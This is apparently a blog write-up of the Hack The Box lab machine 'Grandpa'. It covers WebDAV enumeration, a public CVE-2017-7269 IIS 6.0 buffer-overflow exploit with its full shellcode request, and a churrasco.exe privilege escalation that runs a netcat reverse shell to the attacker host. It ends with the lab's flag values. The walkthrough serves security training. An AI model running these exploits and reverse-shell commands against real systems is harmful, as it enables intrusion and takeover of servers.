---
layout: single
title: Grandpa - Hack The Box
excerpt: "Grandpa is a quick and fun easy box where're goint to exploit Microsoft IIS 6.0 with a Remote buffer overflow script and also we're use the churrasco script to be nt authority system."
date: 2023-01-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-grandpa/new.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Buffer Overflow
  - Token Kidnapping
---

<p align="center">
<img src="/assets/images/htb-writeup-grandpa/grandpa_logo.png">
</p>


Grandpa is a quick and fun easy windows box where're going to exploit the Microsoft IIS 6.0 with a Remote buffer overflow script and also we're use the churrasco script to be nt authority\system

## Port Scan 

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-12 13:19 CST
Nmap scan report for 10.10.10.14
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Thu, 12 Jan 2023 19:19:17 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## What is a WebDav?

WebDAV is a protocol whose basic functionality includes enabling users to share, copy, move and edit files through a web server.

## Enumeration

If we check the latest version of IIS is the 10.0 and the machine have 6.0 that version maybe have a lot of vulnerabities.

We're going to use this tool to enumerate the webdav

```bash
❯ davtest -url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14
********************************************************
NOTE	Random string for this session: FAaudqP2
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	cfm	FAIL
PUT	shtml	FAIL
PUT	jsp	FAIL
PUT	aspx	FAIL
PUT	html	FAIL
PUT	php	FAIL
PUT	jhtml	FAIL
PUT	asp	FAIL
PUT	txt	FAIL
PUT	pl	FAIL
PUT	cgi	FAIL

********************************************************
/usr/bin/davtest Summary:
```

```bash
❯ curl -s -X OPTIONS "http://10.10.10.14" -I
HTTP/1.1 200 OK
Date: Thu, 12 Jan 2023 19:41:42 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
MS-Author-Via: MS-FP/4.0,DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Cache-Control: private
```

## Explotation

If we search in searchsploit we found this

```bash
❯ searchsploit iis 6.0
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure              | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                       | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                         | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                  | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)        | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                      | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                       | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                   | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                   | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                               | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                      | windows/remote/19033.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
❯ searchsploit iis 6.0 | grep "\.py"
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                      | windows/remote/41738.py
```

Copy the url and search on google or another browser you want

```bash
❯ searchsploit -m windows/remote/41738.py
  Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/41738
     Path: /usr/share/exploitdb/exploits/windows/remote/41738.py
File Type: ASCII text, with very long lines
```

After copy the CVE and search in Github we're goint to use this exploit

- [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

```bash
❯ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
Clonando en 'iis6-exploit-2017-CVE-2017-7269'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
Recibiendo objetos: 100% (6/6), listo.
❯ ls
 iis6-exploit-2017-CVE-2017-7269   churrasco.exe
❯ cd iis6-exploit-2017-CVE-2017-7269
❯ ls
 iis6 reverse shell   README.md
❯ mv iis6\ reverse\ shell exploit.py
❯ ls
 exploit.py   README.md
```

Ok now the script is in python2 

```bash
❯ python2 exploit.py
usage:iis6webdav.py targetip targetport reverseip reverseport
```

We can sent a reverse shell 

```bash
❯ python2 exploit.py 10.10.10.14 80 10.10.14.21 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```

I can't enter in the Harry directory

```bash
cd C:\
cd C:\

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\

04/12/2017  04:27 PM    <DIR>          ADFS
04/12/2017  04:04 PM                 0 AUTOEXEC.BAT
04/12/2017  04:04 PM                 0 CONFIG.SYS
04/12/2017  04:32 PM    <DIR>          Documents and Settings
04/12/2017  04:17 PM    <DIR>          FPSE_search
04/12/2017  04:17 PM    <DIR>          Inetpub
12/24/2017  07:18 PM    <DIR>          Program Files
09/16/2021  11:52 AM    <DIR>          WINDOWS
04/12/2017  04:05 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)   1,317,822,464 bytes free

cd DOCUME~1
cd DOCUME~1

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\DOCUME~1

04/12/2017  04:32 PM    <DIR>          .
04/12/2017  04:32 PM    <DIR>          ..
04/12/2017  04:12 PM    <DIR>          Administrator
04/12/2017  04:03 PM    <DIR>          All Users
04/12/2017  04:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)   1,317,605,376 bytes free

C:\DOCUME~1>
```

We have the SeImpersonatePrivilege 

```bash
whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

C:\DOCUME~1>
```

In this case you use the Juicy-potato script but in this machine don't work because we have a problem with the CLSID of the machine 

```bash
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
```

The Github of juicy-potato only works with this versions

```bash
Windows CLSID
Windows 7 Enterprise
Windows 8.1 Enterprise
Windows 10 Enterprise
Windows 10 Professional
Windows Server 2008 R2 Enterprise
Windows Server 2012 Datacenter
Windows Server 2016 Standard
```

When you have this problem only use churrasco.exe you have information here

- [https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)

First Download churrasco from the web 

```bash
❯ ls
 iis6-exploit-2017-CVE-2017-7269   churrasco.exe
```

Now trasnfer to the machine 

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```bash
dir \\10.10.14.21\smbFolder\
dir \\10.10.14.21\smbFolder\
 Volume in drive \\10.10.14.21\smbFolder has no label.
 Volume Serial Number is ABCD-EFAA

 Directory of \\10.10.14.21\smbFolder

01/13/2023  12:25 AM    <DIR>          .
01/12/2023  09:14 PM    <DIR>          ..
01/12/2023  10:24 PM            31,232 churrasco.exe
01/13/2023  12:26 AM    <DIR>          iis6-exploit-2017-CVE-2017-7269
               1 File(s)         31,418 bytes
               3 Dir(s)  15,207,469,056 bytes free

C:\DOCUME~1>
```

Move the churrasco to Temp directory

```bash
cd C:\Windows\Temp

copy \\10.10.14.21\smbFolder\churrasco.exe churrasco.exe
copy \\10.10.14.21\smbFolder\churrasco.exe churrasco.exe
        1 file(s) copied.

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\WINDOWS\Temp

01/13/2023  12:43 AM    <DIR>          .
01/13/2023  12:43 AM    <DIR>          ..
01/12/2023  10:24 PM            31,232 churrasco.exe
02/18/2007  02:00 PM            22,752 UPD55.tmp
12/24/2017  07:19 PM    <DIR>          vmware-SYSTEM
01/12/2023  11:58 PM            22,554 vmware-vmsvc.log
09/16/2021  12:15 PM             5,826 vmware-vmusr.log
01/13/2023  12:01 AM               637 vmware-vmvss.log
               5 File(s)         83,001 bytes
               3 Dir(s)   1,317,462,016 bytes free

C:\WINDOWS\Temp>
```

If you run the script see who we are

```bash
.\churrasco.exe "whoami"
.\churrasco.exe "whoami"
nt authority\system

C:\WINDOWS\Temp>
```

## nt authority\system

We want a reverse shell so we need netcat so transfer to the machine

```bash
locate nc.exe
```

And copy the nc.exe to your current file

```bash
❯ ls
 nc.exe
```

With the same tool transfer to the machine

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Use rlwrap right now to receive only the shell

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
```

```bash
copy "\\10.10.14.21\smbFolder\nc.exe"
copy "\\10.10.14.21\smbFolder\nc.exe"
        1 file(s) copied.

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\WINDOWS\Temp

01/13/2023  12:53 AM    <DIR>          .
01/13/2023  12:53 AM    <DIR>          ..
01/12/2023  10:24 PM            31,232 churrasco.exe
01/12/2023  10:37 PM            28,160 nc.exe
02/18/2007  02:00 PM            22,752 UPD55.tmp
12/24/2017  07:19 PM    <DIR>          vmware-SYSTEM
01/12/2023  11:58 PM            22,554 vmware-vmsvc.log
09/16/2021  12:15 PM             5,826 vmware-vmusr.log
01/13/2023  12:01 AM               637 vmware-vmvss.log
               6 File(s)        111,161 bytes
               3 Dir(s)   1,317,425,152 bytes free

C:\WINDOWS\Temp>
```

Exucute this

```bash
churrasco.exe -d "C:\WINDOWS\TEMP\nc.exe 10.10.14.21 443 -e cmd.exe"
churrasco.exe -d "C:\WINDOWS\TEMP\nc.exe 10.10.14.21 443 -e cmd.exe"
No
No
/churrasco/-->Current User: SYSTEM 
/churrasco/-->Process is not running under NETWORK SERVICE account!
/churrasco/-->Getting NETWORK SERVICE token ...
/churrasco/-->Found NETWORK SERVICE token 0x6c4
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 672 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 680 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 688 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x674
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x66c
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
The system cannot find the path specified.

C:\WINDOWS\TEMP>
```

I had mistakes when I execute churrasco but I recive the shell

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.14] 1047
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\system

C:\WINDOWS\TEMP>
```

## User Flag

You can enter in harry's directory

```bash
cd Desktop

type user.txt
type user.txt
bdff5ec67c3cff017f2bedc146a5d869
C:\DOCUME~1\Harry\Desktop>
```

## Root Flag

```bash
 Directory of C:\DOCUME~1\Administrator\Desktop

04/12/2017  04:28 PM    <DIR>          .
04/12/2017  04:28 PM    <DIR>          ..
04/12/2017  04:29 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   1,373,999,104 bytes free

type root.txt
type root.txt
9359e905a2c35f861f6a57cecf28bb7b
C:\DOCUME~1\Administrator\Desktop>
```


